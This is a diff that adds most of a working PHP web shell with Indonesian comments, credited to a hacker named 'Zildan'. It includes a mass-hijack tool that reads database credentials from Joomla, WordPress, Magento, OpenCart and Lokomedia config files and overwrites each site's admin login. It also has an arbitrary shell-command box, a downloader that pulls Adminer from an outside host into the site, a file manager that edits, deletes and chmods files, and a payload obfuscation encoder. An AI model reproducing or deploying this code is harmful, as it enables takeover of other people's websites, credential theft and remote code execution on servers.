+ if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
+ echo "username atau password harus lebih dari 6 karakter";
+ } else {
+ $user_baru = $_POST['user_baru'];
+ $pass_baru = md5($_POST['pass_baru']);
+ $conf = $_POST['config_dir'];
+ $scan_conf = scandir($conf);
+ foreach($scan_conf as $file_conf) {
+ if(!is_file("$conf/$file_conf")) continue;
+ $config = file_get_contents("$conf/$file_conf");
+ if(preg_match("/JConfig|joomla/",$config)) {
+ $dbhost = ambilkata($config,"host = '","'");
+ $dbuser = ambilkata($config,"user = '","'");
+ $dbpass = ambilkata($config,"password = '","'");
+ $dbname = ambilkata($config,"db = '","'");
+ $dbprefix = ambilkata($config,"dbprefix = '","'");
+ $prefix = $dbprefix."users";
+ $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+ $db = mysql_select_db($dbname);
+ $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+ $result = mysql_fetch_array($q);
+ $id = $result['id'];
+ $site = ambilkata($config,"sitename = '","'");
+ $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
+ echo "Config => ".$file_conf."<br>";
+ echo "CMS => Joomla<br>";
+ if($site == '') {
+ echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
+ } else {
+ echo "Sitename => $site<br>";
+ }
+ if(!$update OR !$conn OR !$db) {
+ echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+ } else {
+ echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+ }
+ mysql_close($conn);
+ } elseif(preg_match("/WordPress/",$config)) {
+ $dbhost = ambilkata($config,"DB_HOST', '","'");
+ $dbuser = ambilkata($config,"DB_USER', '","'");
+ $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
+ $dbname = ambilkata($config,"DB_NAME', '","'");
+ $dbprefix = ambilkata($config,"table_prefix  = '","'");
+ $prefix = $dbprefix."users";
+ $option = $dbprefix."options";
+ $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+ $db = mysql_select_db($dbname);
+ $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+ $result = mysql_fetch_array($q);
+ $id = $result[ID];
+ $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
+ $result2 = mysql_fetch_array($q2);
+ $target = $result2[option_value];
+ if($target == '') {
+ $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+ } else {
+ $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
+ }
+ $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
+ echo "Config => ".$file_conf."<br>";
+ echo "CMS => Wordpress<br>";
+ echo $url_target;
+ if(!$update OR !$conn OR !$db) {
+ echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+ } else {
+ echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+ }
+ mysql_close($conn);
+ } elseif(preg_match("/Magento|Mage_Core/",$config)) {
+ $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
+ $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
+ $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
+ $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
+ $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
+ $prefix = $dbprefix."admin_user";
+ $option = $dbprefix."core_config_data";
+ $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+ $db = mysql_select_db($dbname);
+ $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
+ $result = mysql_fetch_array($q);
+ $id = $result[user_id];
+ $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
+ $result2 = mysql_fetch_array($q2);
+ $target = $result2[value];
+ if($target == '') {
+ $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+ } else {
+ $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
+ }
+ $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
+ echo "Config => ".$file_conf."<br>";
+ echo "CMS => Magento<br>";
+ echo $url_target;
+ if(!$update OR !$conn OR !$db) {
+ echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+ } else {
+ echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+ }
+ mysql_close($conn);
+ } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
+ $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
+ $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
+ $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
+ $dbname = ambilkata($config,"'DB_DATABASE', '","'");
+ $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
+ $prefix = $dbprefix."user";
+ $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+ $db = mysql_select_db($dbname);
+ $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
+ $result = mysql_fetch_array($q);
+ $id = $result[user_id];
+ $target = ambilkata($config,"HTTP_SERVER', '","'");
+ if($target == '') {
+ $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+ } else {
+ $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
+ }
+ $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
+ echo "Config => ".$file_conf."<br>";
+ echo "CMS => OpenCart<br>";
+ echo $url_target;
+ if(!$update OR !$conn OR !$db) {
+ echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+ } else {
+ echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+ }
+ mysql_close($conn);
+ } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
+ $dbhost = ambilkata($config,'server = "','"');
+ $dbuser = ambilkata($config,'username = "','"');
+ $dbpass = ambilkata($config,'password = "','"');
+ $dbname = ambilkata($config,'database = "','"');
+ $prefix = "users";
+ $option = "identitas";
+ $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+ $db = mysql_select_db($dbname);
+ $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
+ $result = mysql_fetch_array($q);
+ $target = $result[alamat_website];
+ if($target == '') {
+ $target2 = $result[url];
+ $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+ if($target2 == '') {
+ $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+ } else {
+ $cek_login3 = file_get_contents("$target2/adminweb/");
+ $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
+ if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
+ $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
+ } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
+ $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
+ } else {
+ $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
+ }
+ }
+ } else {
+ $cek_login = file_get_contents("$target/adminweb/");
+ $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
+ if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
+ $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
+ } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
+ $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
+ } else {
+ $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
+ }
+ }
+ $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
+ echo "Config => ".$file_conf."<br>";
+ echo "CMS => Lokomedia<br>";
+ if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
+ echo $url_target2;
+ } else {
+ echo $url_target;
+ }
+ if(!$update OR !$conn OR !$db) {
+ echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+ } else {
+ echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+ }
+ mysql_close($conn);
+ }
+ }
+ }
+ } else {
+ echo "<center>
+ <h1>Auto Edit User Config</h1>
+ <form method='post'>
+ DIR Config: <br>
+ <input type='text' size='50' name='config_dir' value='$dir'><br><br>
+ Set User & Pass: <br>
+ <input type='text' name='user_baru' value='zet brohhh' placeholder='user_baru'><br>
+ <input type='text' name='pass_baru' value='zet brohhh' placeholder='pass_baru'><br>
+ <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
+ </form>
+ <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
+ ";
+ }
+ 
+ } elseif($_GET['do'] == 'endec') {
+ @ini_set('output_buffering',0); 
+ @ini_set('display_errors', 0);
+ $text = $_POST['code'];
+ ?>
+ <center>
+ <h2>Encode And Decode</h2>
+ <form method="post">
+ <br>
+ <textarea class='form-control con7' cols='60' rows='10' name="code"></textarea>
+ <br><br>
+ <select class='form-control con7' size="1" name="ope">
+ <center>
+ <option value="urlencode">url</option>
+ <option value="base64">base64</option>
+ <option value="ur">convert_uu</option>
+ <option value="json">json</option>
+ <option value="gzinflates">gzinflate - base64</option>
+ <option value="str2">str_rot13 - base64</option>
+ <option value="gzinflate">str_rot13 - gzinflate - base64</option>
+ <option value="gzinflater">gzinflate - str_rot13 - base64</option>
+ <option value="gzinflatex">gzinflate - str_rot13 - gzinflate - base64</option>
+ <option value="gzinflatew">str_rot13-convert_uu-url-gzinflate-str_rot13-base64-convert_uu-gzinflate-url-str_rot13-gzinflate-base64</option>
+ <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
+ <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
+ </center>
+ </select>
+ &nbsp;<br><br><input class='kntd' type='submit' name='submit' value='Encode'>
+ <input class='kntd' type='submit' name='submits' value='Decode'>
+ </form>
+ <br>
+ <?php 
+ $submit = $_POST['submit'];
+ if (isset($submit)){
+ $op = $_POST["ope"];
+ switch ($op) {case 'base64': $codi=base64_encode($text);
+ break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
+ break;case 'json' : $codi=json_encode(utf8_encode($text));
+ break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
+ break;case 'gzinflater' : $codi=base64_encode(str_rot13(gzdeflate($text)));
+ break;case 'gzinflatex' : $codi=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
+ break;case 'gzinflatew' : $codi=base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
+ break;case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
+ break;case 'str2' : $codi=base64_encode(str_rot13($text));
+ break;case 'urlencode' : $codi=rawurlencode($text);
+ break;case 'ur' : $codi=convert_uuencode($text);
+ break;case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
+ break;default:break;}}
+ 
+ $submit = $_POST['submits'];
+ if (isset($submit)){
+ $op = $_POST["ope"];
+ switch ($op) {case 'base64': $codi=base64_decode($text);
+ break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
+ break;case 'json' : $codi=utf8_decode(json_decode($text));
+ break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
+ break;case 'gzinflater' : $codi=gzinflate(str_rot13(base64_decode($text)));
+ break;case 'gzinflatex' : $codi=gzinflate(str_rot13(gzinflate(base64_decode($text))));
+ break;case 'gzinflatew' : $codi=str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
+ break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
+ break;case 'str2' : $codi=str_rot13(base64_decode($text));
+ break;case 'urlencode' : $codi=rawurldecode($text);
+ break;case 'ur' : $codi=convert_uudecode($text);
+ break;case 'url' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
+ break;default:break;}}
+ $html = htmlentities(stripslashes($codi));
+ echo "<form><textarea cols=60 rows=10 class='form-control con7' >".$html."</textarea></center></form><br/><br/>";
+ } elseif($_GET['do'] == 'hashgen') {
+ $submit = $_POST['enter'];
+ if (isset($submit)) {
+ $pass = $_POST['password']; // password
+ $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
+ $hash = md5($pass); // md5 hash #1
+ $md4 = hash("md4", $pass);
+ $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
+ $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
+ $hash1 = sha1($pass); // sha1 hash #4
+ $sha256 = hash("sha256", $text);
+ $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
+ $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
+ }
+ echo '<form action="" method="post">';
+ echo '<center><h2>Hash Generator</h2>';
+ echo '<table>';
+ echo 'Masukkan teks yang ingin di encrypt: ';
+ echo '<input class="inputz" type="text" name="password" size="40">';
+ echo '<input class="inputzbut" type="submit" name="enter" value="Hash!">';
+ echo '<br>';
+ echo 'Original Password: <input class=inputz type=text size=50 value='.$pass.'><br><br>';
+ echo 'MD5: <input class=inputz type=text size=50 value='.$hash.'><br><br>';
+ echo 'MD4: <input class=inputz type=text size=50 value='.$md4 .'><br><br>';
+ echo 'MD5 with Salt: <input class=inputz type=text size=50 value='.$hash_md5.'><br><br>';
+ echo 'MD5 with Salt & Sha1: <input class=inputz type=text size=50 value='.$hash_md5_double.'><br><br>';
+ echo 'Sha1: <input class=inputz type=text size=50 value='.$hash1 .'><br><br>';
+ echo 'Sha256: <input class=inputz type=text size=50 value='.$sha256.'><br><br>';
+ echo 'Sha1 with Salt: <input class=inputz type=text size=50 value='.$hash1_sha1.'><br><br>';
+ echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
+ } elseif($_GET['do'] == 'about') {
+   ?>
+   <tr>
+   <td>
+   <center>
+   <h2 style='color'#00ddff'>About Me</font></h2>
+   <p style='color: white;'>Team: JawaBaratCyber - <font color="red">Cowok Tersakiti Team</font> - Indonrsian error system - JavaCyberArmy - Dan lain lain</p>
+   </center>
+   </td>
+   </tr>
+   <?php
+   } elseif($_GET['do'] == 'adminer') {
+ $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
+ function adminer($url, $isi) {
+ $fp = fopen($isi, "w");
+ $ch = curl_init();
+ curl_setopt($ch, CURLOPT_URL, $url);
+ curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+ curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+ curl_setopt($ch, CURLOPT_FILE, $fp);
+ return curl_exec($ch);
+ curl_close($ch);
+ fclose($fp);
+ ob_flush();
+ flush();
+ }
+ if(file_exists('adminer.php')) {
+ echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
+ } else {
+ if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
+ echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
+ } else {
+ echo "<center><font color=red>gagal buat file adminer</font></center>";
+ }  
+
+ }
+
+}  elseif($_GET['to'] == 'cmd') {
+	echo "<form method='post'>
+	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
+	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
+	</form>";
+	if($_POST['do_cmd']) {
+		echo "<pre>".exe($_POST['cmd'])."</pre>";
+	}
+}
+
+if(isset($_GET['filesrc'])){
+echo "<tr><td>Current File : ";
+echo $_GET['filesrc'];
+echo '</tr></td></table><br />';
+echo "[ <a href='?path=$path'>Kembali</a> ]"; 
+echo('<textarea class="potext" cols=80 rows=20> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
+}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
+if($_POST['opt'] == 'chmod'){
+if(isset($_POST['perm'])){
+if(chmod($_POST['path'],$_POST['perm'])){
+echo '<font color="lime">CANGE PERM SUCCES !!!!!</font><br/>';
+echo "[ <a href='?path=$path'>Kembali</a> ]";
+}else{
+echo '<script> alert("CANGE PERM GAGAL NJING !!!!!")</font><br />';
+}
+}
+echo '<form method="POST">
+Permission : <br><input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left"/>
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="chmod"><br>
+<input type="submit" value="submit" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver"/>
+</form>';
+}elseif($_POST['opt'] == 'rename'){
+if(isset($_POST['newname'])){
+if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+echo '<font color="lime">RENAME SUCCES !!!!!</font><br/>';
+echo "[ <a href='?path=$path'>Kembali</a> ]";
+}else{
+echo '<script> alert("RENAME GAGAL !!!!!")</script><br />';
+}
+$_POST['name'] = $_POST['newname'];
+}
+echo '<form method="POST">
+New Name <br><input name="newname" type="text" size="20" value="'.$_POST['name'].'" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:black;color:silver;border:2px solid silver; text-align: left"/>
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="rename"><br>
+<input type="submit" value="submit" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver"/>
+</form>';
+}elseif($_POST['opt'] == 'edit'){
+if(isset($_POST['src'])){
+$fp = fopen($_POST['path'],'w');
+if(fwrite($fp,$_POST['src'])){
+echo '<font color="lime">EDIT SUCCES<br/>';
+echo "[ <a href='?path=$path'>Kembali</a> ]";
+}else{
+echo '<script> alert("EDIT GAGAL CONG !!!!!")</script></font><br/>';
+}
+fclose($fp);
+}
+echo '<form method="POST">
+<textarea class="potext" cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="edit">
+<input type="submit" value="Save" style="margin-top:4px;width:500px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver;border-radius:5px"/>
+</form>';
+}
+echo '</center>';
+}else{
+echo '</table><br/><center>';
+if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
+if($_POST['type'] == 'dir'){
+if(rmdir($_POST['path'])){
+echo '<script> alert("SUCCES !!!!!")</script><br/>';
+}else{
+echo '<font color="red">Directory Gagal Terhapus om                                                                                                                                                                                                                                                                                           </font><br/>';
+}
+}elseif($_POST['type'] == 'file'){
+if(unlink($_POST['path'])){
+echo '<script> alert("SUCCES !!!!!")</script><br/>';
+}else{
+echo '<font color="red">File Gagal Dihapus om</font><br/>';
+}
+}
+}
+echo '</center>';
+$scandir = scandir($path);
+echo '<div id="content"><table width="100%" class="td_table">
+<tr class="first">
+<td class="pl"><center><font>Name</peller></center></td>
+<td class="pl"><center><font>Size</peller></center></td>
+<td class="pl"><center><font>Permission</peller></center></td>
+<td class="pl"><center><font>Action</peller></center></td>
+</tr>';
+foreach($scandir as $dir){
+if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
+echo '<tr class="s_tb">
+<td class="pt"><img src="data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs="> <a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
+<td class="pl"><center>--</center></td>
+<td class="pl"><center>';
+if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
+elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
+echo perms($path.'/'.$dir);
+if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
+
+echo '</center></td>
+<td class="pl"><center><form method="POST" action="?option&path='.$path.'">
+<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
+<option value="">Select</option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">RenaMe</option>
+</select>
+<input type="hidden" name="type" value="dir">
+<input type="hidden" name="name" value="'.$dir.'">
+<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
+<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
+</form></center></td>
+</tr>';
+}
+echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
+foreach($scandir as $file){
+if(!is_file($path.'/'.$file)) continue;
+$size = filesize($path.'/'.$file)/1024;
+$size = round($size,3);
+if($size >= 1024){
+$size = round($size/1024,2).' MB';
+}else{
+$size = $size.' KB';
+}
+
+echo '<tr class="pl">
+<td class="pt"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII="> <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
+<td class="pl"><center>'.$size.'</center></td>
+<td class="pl"><center>';
+if(is_writable($path.'/'.$file)) echo '<font color="lime">';
+elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
+echo perms($path.'/'.$file);
+if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
+echo '</center></td>
+<td class="pl"><center><form method="POST" action="?option&path='.$path.'">
+<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
+<option value="">Select</option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+<option value="edit">Edit</option>
+</select>
+<input type="hidden" name="type" value="file">
+<input type="hidden" name="name" value="'.$file.'">
+<input type="hidden" name="path" value="'.$path.'/'.$file.'">
+<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
+</form></center></td>
+</tr>';
+}
+echo '</table>
+</div>';
+}
+echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">" Zildan</center>
+</body>
+</html>';
+function perms($file){
+$perms = fileperms($file);
+
+if (($perms & 0xC000) == 0xC000) {
+// Socket
+$info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+// Symbolic Link
+$info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+// Regular
+$info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+// Block special
+$info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+// Directory
+$info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+// Character special
+$info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+// FIFO pipe
+$info = 'p';
+} else {
+// Unknown
+$info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+(($perms & 0x0800) ? 's' : 'x' ) :
+(($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+(($perms & 0x0400) ? 's' : 'x' ) :
+(($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+(($perms & 0x0200) ? 't' : 'x' ) :
+(($perms & 0x0200) ? 'T' : '-'));
+
+return $info;
+}
 ?>
